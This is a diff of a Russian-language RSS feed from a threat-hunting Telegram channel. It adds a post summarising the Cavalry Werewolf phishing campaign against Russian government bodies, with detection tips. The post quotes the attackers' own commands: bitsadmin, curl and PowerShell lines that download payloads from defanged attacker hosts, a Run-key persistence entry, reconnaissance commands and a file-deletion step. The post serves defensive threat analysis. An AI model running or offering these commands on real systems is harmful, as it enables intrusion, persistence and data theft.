@@ -1,5 +1,60 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Thu, 06 Nov 2025 06:02:23 +0000</lastBuildDate><item><title>Очередной EDR silencer, основаный на WFP.(3 дня назад опубликовано)</title><link>https://t.me/ThreatHuntingFather/917</link><description>Очередной EDR silencer, основаный на WFP.(3 дня назад опубликовано)
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Fri, 07 Nov 2025 07:24:51 +0000</lastBuildDate><item><title>Cavalry Werewolf: целевая атака на госсектор РФ</title><link>https://t.me/ThreatHuntingFather/918</link><description>Cavalry Werewolf: целевая атака на госсектор РФ
+⚙️ Формат атаки
+🎯 Фишинг → архив с паролем («Служебная записка», «План работы почтового сервера») → исполняемый файл с бэкдором BackDoor.ShellNET.1 (на основе Reverse-Shell-CS).
+После запуска – обратное соединение с C2 и ручное выполнение команд через cmd.exe.
+Через него операторы докачивают новые модули через LOLBAS:
+bitsadmin /transfer www /download hxxp://ip/winpot.exe C:\Users\Public\Downloads\winpot.exe
+Первым ставится Trojan.FileSpyNET.5 – стилер документов, картинок и txt-файлов → IP/fileupper/getupper.php.
+Затем – BackDoor.Tunnel.41 (ReverseSocks5) для создания SOCKS5-туннеля и незаметного удалённого доступа.
+🧠 Цели и действия атакующего
+Атакующие проводят ручную разведку через cmd.exe:
+whoami
+ipconfig /all
+net user
+dir C:\Users\&lt;user&gt;\Downloads
+dir C:\Users\Public\Pictures
+Проверяют сетевые прокси:
+[System.Net.WebRequest]::DefaultWebProxy.GetProxy("https://google.com")
+Загружают новые модули через PowerShell и curl:
+powershell -Command Invoke-WebRequest -Uri "hxxps://sss.qwadx.com/revv3.exe" -OutFile "C:\Users\Public\Pictures\rev.exe"
+curl -o C:\Users\Public\Pictures\rev.exe hxxp://IP/code.exe
+Закрепление через Run-ключ:
+REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Service /t REG_SZ /d C:\Users\Public\Pictures\win.exe /f
+Удаление следов: powershell -Command Remove-Item C:\Users\Public\Pictures\732.exe.
+🧩 Инструменты Cavalry Werewolf
+BackDoor.ShellNET.1 / .2 — C#-бэкдоры (Reverse-Shell-CS, Telegram-бот).
+BackDoor.ReverseProxy.1 — ReverseSocks5 (Golang), revv2.exe -connect IP:10443.
+Trojan.Inject5.57968 — инжект в aspnet_compiler.exe, шифрование RC2 / AES, C2.
+Trojan.Packed2.49708 / Siggen31.54011 — лоадеры Spy-бэкдоров с XOR-дешифровкой.
+Trojan.Packed2.49862 — троянизированные программы (WinRAR, 7-Zip, VS Code, AkelPad, SumatraPDF) → доставляют AdaptixC2, Havoc, CobaltStrike, Meterpreter, AsyncRAT.
+Trojan.Clipper.808 — крадет криптокошельки, копирует себя в %APPDATA%\systemservices\svc_host.exe, добавляет Run-ключ SystemServicesHost, сообщает в Telegram-бот о заменённых адресах.
+⛓️‍💥Типовая цепочка действий
+1️⃣ Фишинг → BackDoor.ShellNET (обратный шелл).
+2️⃣ Разведка: whoami / ipconfig / net user.
+3️⃣ Загрузка новых модулей через bitsadmin, PowerShell или curl.
+4️⃣ Закрепление через Run-ключ или планировщик.
+5️⃣ Инжект в .NET-процесс, маскировка под легитимный aspnet_compiler.exe.
+6️⃣ Создание туннелей и Telegram-C2.
+7️⃣ Эксфильтрация документов, удаление следов.
+🧠 Тактические наблюдения
+Массовое использование open-source (Reverse-Shell-CS, ReverseSocks5, AdaptixC2, Havoc).
+Telegram-C2 как универсальный контроль вместо доменов.
+Мимикрия под госдокументы и троянизированные программы.
+Активная LOLBAS-цепочка: bitsadmin → powershell → cmd.exe.
+Хранение и запуск из C:\Users\Public\Pictures|Libraries|Downloads.
+Переход от разведки к туннелям и долговременному C2 в одном цикле.
+🔍 Что отслеживать
+• Исполнение EXE из Public-директорий.
+• Bitsadmin с /transfer и URL-адресами.
+• PowerShell Invoke-WebRequest → Public-папки.
+• Инжект в aspnet_compiler.exe.
+• Run-ключи с путём на C:\Users\Public\.
+• Трафик к api.telegram.org или подозрительным IP
+🔗https://news.drweb.ru/show/?i=15078
+🦔 THF
+
+[Media: Фото]</description><pubDate>Fri, 07 Nov 2025 07:24:51 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_918</guid></item><item><title>Очередной EDR silencer, основаный на WFP.(3 дня назад опубликовано)</title><link>https://t.me/ThreatHuntingFather/917</link><description>Очередной EDR silencer, основаный на WFP.(3 дня назад опубликовано)
 📌Основным поинтом когда «хулиганы зрения лишают», является падение телеметрии с конечной точки.
 ➖Что делает атакующий? Правильно - добавляет фильтры.
 ⏳Если вы каждый день знаете, сколько генерирует юзер действий, то такое падение телеметрии, вы должны сразу увидеть(заалертить)
